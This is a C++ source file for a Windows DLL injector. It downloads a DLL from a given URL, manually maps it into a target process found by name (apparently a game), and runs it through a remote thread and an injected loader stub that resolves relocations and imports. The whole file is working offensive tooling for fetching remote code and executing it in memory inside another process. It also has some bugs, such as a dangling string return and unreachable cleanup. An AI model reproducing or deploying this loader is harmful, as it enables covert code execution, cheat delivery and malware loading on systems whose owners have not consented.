#include <iostream>
#include <string>
#include "stdafx.hpp"
#include <Windows.h>
#include <TlHelp32.h>
#include <stdexcept>
#include <vector>

#include <wininet.h>
#pragma comment(lib, "Wininet")

using namespace std;

typedef HMODULE(__stdcall* pLoadLibraryA)(LPCSTR);
typedef FARPROC(__stdcall* pGetProcAddress)(HMODULE, LPCSTR);

typedef INT(__stdcall* dllmain)(HMODULE, DWORD, LPVOID);


struct loaderdata
{
	LPVOID ImageBase;

	PIMAGE_NT_HEADERS NtHeaders;
	PIMAGE_BASE_RELOCATION BaseReloc;
	PIMAGE_IMPORT_DESCRIPTOR ImportDirectory;

	pLoadLibraryA fnLoadLibraryA;
	pGetProcAddress fnGetProcAddress;

};

DWORD FindProcessId(string processName)
{
	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);

	HANDLE processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processSnapshot == INVALID_HANDLE_VALUE)
		return 0;

	Process32First(processSnapshot, &processInfo);
	if (!processName.compare(processInfo.szExeFile))
	{
		CloseHandle(processSnapshot);
		return processInfo.th32ProcessID;
	}

	while (Process32Next(processSnapshot, &processInfo))
	{
		if (!processName.compare(processInfo.szExeFile))
		{
			CloseHandle(processSnapshot);
			return processInfo.th32ProcessID;
		}
	}

	CloseHandle(processSnapshot);
	return 0;
}

LPCSTR FindProcessName(DWORD processId)
{
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);

	if (hProcess != NULL)
	{
		char szProcessPath[MAX_PATH];
		DWORD size = sizeof(szProcessPath);

		if (QueryFullProcessImageName(hProcess, 0, szProcessPath, &size) != 0)
		{
			std::string processPath(szProcessPath);
			size_t lastBackslash = processPath.find_last_of('\\');
			if (lastBackslash != std::string::npos)
			{
				std::string processName = processPath.substr(lastBackslash + 1);
				return processName.c_str();
			}
		}

		CloseHandle(hProcess);
	}

	return nullptr;
}

DWORD __stdcall LibraryLoader(LPVOID Memory)
{

	loaderdata* LoaderParams = (loaderdata*)Memory;

	PIMAGE_BASE_RELOCATION pIBR = LoaderParams->BaseReloc;

	DWORD delta = (DWORD)((LPBYTE)LoaderParams->ImageBase - LoaderParams->NtHeaders->OptionalHeader.ImageBase); // Calculate the delta

	while (pIBR->VirtualAddress)
	{
		if (pIBR->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION))
		{
			int count = (pIBR->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
			PWORD list = (PWORD)(pIBR + 1);

			for (int i = 0; i < count; i++)
			{
				if (list[i])
				{
					PDWORD ptr = (PDWORD)((LPBYTE)LoaderParams->ImageBase + (pIBR->VirtualAddress + (list[i] & 0xFFF)));
					*ptr += delta;
				}
			}
		}

		pIBR = (PIMAGE_BASE_RELOCATION)((LPBYTE)pIBR + pIBR->SizeOfBlock);
	}

	PIMAGE_IMPORT_DESCRIPTOR pIID = LoaderParams->ImportDirectory;

	// Resolve DLL imports
	while (pIID->Characteristics)
	{
		PIMAGE_THUNK_DATA OrigFirstThunk = (PIMAGE_THUNK_DATA)((LPBYTE)LoaderParams->ImageBase + pIID->OriginalFirstThunk);
		PIMAGE_THUNK_DATA FirstThunk = (PIMAGE_THUNK_DATA)((LPBYTE)LoaderParams->ImageBase + pIID->FirstThunk);

		HMODULE hModule = LoaderParams->fnLoadLibraryA((LPCSTR)LoaderParams->ImageBase + pIID->Name);

		if (!hModule)
			return FALSE;

		while (OrigFirstThunk->u1.AddressOfData)
		{
			if (OrigFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)
			{
				// Import by ordinal
				DWORD Function = (DWORD)LoaderParams->fnGetProcAddress(hModule,
					(LPCSTR)(OrigFirstThunk->u1.Ordinal & 0xFFFF));

				if (!Function)
					return FALSE;

				FirstThunk->u1.Function = Function;
			}
			else
			{
				// Import by name
				PIMAGE_IMPORT_BY_NAME pIBN = (PIMAGE_IMPORT_BY_NAME)((LPBYTE)LoaderParams->ImageBase + OrigFirstThunk->u1.AddressOfData);
				DWORD Function = (DWORD)LoaderParams->fnGetProcAddress(hModule, (LPCSTR)pIBN->Name);
				if (!Function)
					return FALSE;

				FirstThunk->u1.Function = Function;
			}
			OrigFirstThunk++;
			FirstThunk++;
		}
		pIID++;
	}

	if (LoaderParams->NtHeaders->OptionalHeader.AddressOfEntryPoint)
	{
		dllmain EntryPoint = (dllmain)((LPBYTE)LoaderParams->ImageBase + LoaderParams->NtHeaders->OptionalHeader.AddressOfEntryPoint);

		return EntryPoint((HMODULE)LoaderParams->ImageBase, DLL_PROCESS_ATTACH, NULL); // Call the entry point
	}
	return TRUE;
}


DWORD __stdcall stub()
{
	return 0;
}


struct EnumWindowsData {
	DWORD targetProcessId;
	HWND targetWindow;
};

BOOL CALLBACK EnumWindowsCallback(HWND hwnd, LPARAM lParam) {
	EnumWindowsData& data = *reinterpret_cast<EnumWindowsData*>(lParam);

	DWORD windowProcessId;
	GetWindowThreadProcessId(hwnd, &windowProcessId);

	if (windowProcessId == data.targetProcessId) {
		data.targetWindow = hwnd;
		return FALSE;
	}

	return TRUE;
}

bool isDllContentType(const std::wstring& contentType) {

	std::vector<std::wstring> dllContentTypes = {
		L"application/octet-stream",
		L"application/x-msdownload",
		L"application/x-dosexec",
		L"application/x-executable",
		L"application/x-dll",
		L"application/x-win32-microsoftdll",
		L"application/vnd.microsoft.portable-executable",
		L"application/x-msdos-program"
	};

	for (const std::wstring& dllType : dllContentTypes) {
		if (contentType == dllType) {
			return true;
		}
	}

	return false;
}

bool verifyDll(LPCSTR dllUrl)
{
	HINTERNET hInternet, hConnect;

	hInternet = InternetOpen("Loader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

	if (!hInternet)
	{
		return false;
	}

	DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_AUTO_REDIRECT;
	hConnect = InternetOpenUrl(hInternet, dllUrl, NULL, 0, flags, 0);

	if (!hConnect)
	{
		return false;
	}

	DWORD disableDecoding = 1;
	InternetSetOption(hConnect, INTERNET_OPTION_HTTP_DECODING, &disableDecoding, sizeof(DWORD));

	WCHAR contentType[MAX_PATH];
	DWORD contentTypeSize = sizeof(contentType);

	bool result = false;

	if (HttpQueryInfoW(hConnect, HTTP_QUERY_CONTENT_TYPE, contentType, &contentTypeSize, NULL))
	{
		if (isDllContentType(contentType)) {
			result = true;
		}
	}

	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);

	return result;

}

PVOID remoteDownloadDll(LPCSTR dllUrl, DWORD& dllSize) {
	HINTERNET hInternet, hConnect;

	hInternet = InternetOpen("Loader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

	if (hInternet) {
		// Open URL
		hConnect = InternetOpenUrl(hInternet, dllUrl, NULL, 0, INTERNET_FLAG_RELOAD, 0);
			
		if (!hConnect)
		{
			throw std::runtime_error("Fail to open URL");
		}

		std::vector<char> dllBuffer;
		DWORD bytesRead = 0;
		char buffer[1024];

		// Reading DLL Bytes
		while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
			dllBuffer.insert(dllBuffer.end(), buffer, buffer + bytesRead);
		}

		// Close Connection
		InternetCloseHandle(hConnect);

		// Close WinINet Library
		InternetCloseHandle(hInternet);

		// Calcule DLL Length
		dllSize = static_cast<DWORD>(dllBuffer.size());

		// Create buffer and copy DLL bytes
		PVOID dllData = malloc(dllSize);
		if (dllData) {
			memcpy(dllData, dllBuffer.data(), dllSize);
			return dllData;
		}
		else {
			throw std::runtime_error("Fail to allocate bytes to buffer.");
		}

		// Close WinINet Library
		InternetCloseHandle(hInternet);

		if (hConnect) {
			InternetCloseHandle(hConnect);
		}

		if (hInternet) {
			InternetCloseHandle(hInternet);
		}
	}
	else {
		std::cerr << "Fail to start WinInet." << std::endl;
		return nullptr;
	}
}


int injector(LPCSTR dllUrl, LPCSTR processName, bool waitWindow = false)
{

	DWORD ProcessId = FindProcessId(processName);

	EnumWindowsData data;
	data.targetProcessId = ProcessId;
	data.targetWindow = nullptr;

	if (waitWindow)
	{
		do
		{
			EnumWindows(EnumWindowsCallback, reinterpret_cast<LPARAM>(&data));

			if (data.targetWindow != nullptr)
			{
				std::this_thread::sleep_for(std::chrono::milliseconds(15000)); // wait game start
				break;
			}

			std::this_thread::sleep_for(std::chrono::milliseconds(1000));

		} while (true);
	}

	try {
		loaderdata LoaderParams;

		// Download Remote DLL
		DWORD dllSize;

		PVOID FileBuffer = remoteDownloadDll(dllUrl, dllSize);

		// Target Dll's DOS Header
		PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)FileBuffer;
		// Target Dll's NT Headers
		PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)FileBuffer + pDosHeader->e_lfanew);

		// Opening target process.
		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);
		// Allocating memory for the DLL
		PVOID ExecutableImage = VirtualAllocEx(hProcess, NULL, pNtHeaders->OptionalHeader.SizeOfImage,
			MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		// Copy the headers to target process
		WriteProcessMemory(hProcess, ExecutableImage, FileBuffer,
			pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);

		// Target Dll's Section Header
		PIMAGE_SECTION_HEADER pSectHeader = (PIMAGE_SECTION_HEADER)(pNtHeaders + 1);
		// Copying sections of the dll to the target process
		for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
		{
			WriteProcessMemory(hProcess, (PVOID)((LPBYTE)ExecutableImage + pSectHeader[i].VirtualAddress),
				(PVOID)((LPBYTE)FileBuffer + pSectHeader[i].PointerToRawData), pSectHeader[i].SizeOfRawData, NULL);
		}

		// Allocating memory for the loader code.
		PVOID LoaderMemory = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE); // Allocate memory for the loader code

		LoaderParams.ImageBase = ExecutableImage;
		LoaderParams.NtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)ExecutableImage + pDosHeader->e_lfanew);

		LoaderParams.BaseReloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)ExecutableImage
			+ pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
		LoaderParams.ImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)ExecutableImage
			+ pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

		LoaderParams.fnLoadLibraryA = LoadLibraryA;
		LoaderParams.fnGetProcAddress = GetProcAddress;

		// Write the loader information to target process
		WriteProcessMemory(hProcess, LoaderMemory, &LoaderParams, sizeof(loaderdata),
			NULL);
		// Write the loader code to target process
		WriteProcessMemory(hProcess, (PVOID)((loaderdata*)LoaderMemory + 1), LibraryLoader,
			(DWORD)stub - (DWORD)LibraryLoader, NULL);
		// Create a remote thread to execute the loader code
		HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((loaderdata*)LoaderMemory + 1),
			LoaderMemory, 0, NULL);

		// std::cout << "Address of Loader: " << std::hex << LoaderMemory << std::endl;
		// std::cout << "Address of Image: " << std::hex << ExecutableImage << std::endl;


		// Wait for the loader to finish executing
		WaitForSingleObject(hThread, INFINITE);
	} catch (const std::exception& e) {

		std::cerr << "[-] Error with dll injection." << std::endl;
		std::cerr << "[-] Error: " << e.what() << std::endl;
		std::cerr << "[!] Process Id: " << ProcessId << std::endl;
		std::cerr << "[!] DLL URL: " << dllUrl << std::endl;
		
		return EXIT_FAILURE;
	}

	// free the allocated loader code
	// VirtualFreeEx(hProcess, LoaderMemory, 0, MEM_RELEASE);

	return EXIT_SUCCESS;
}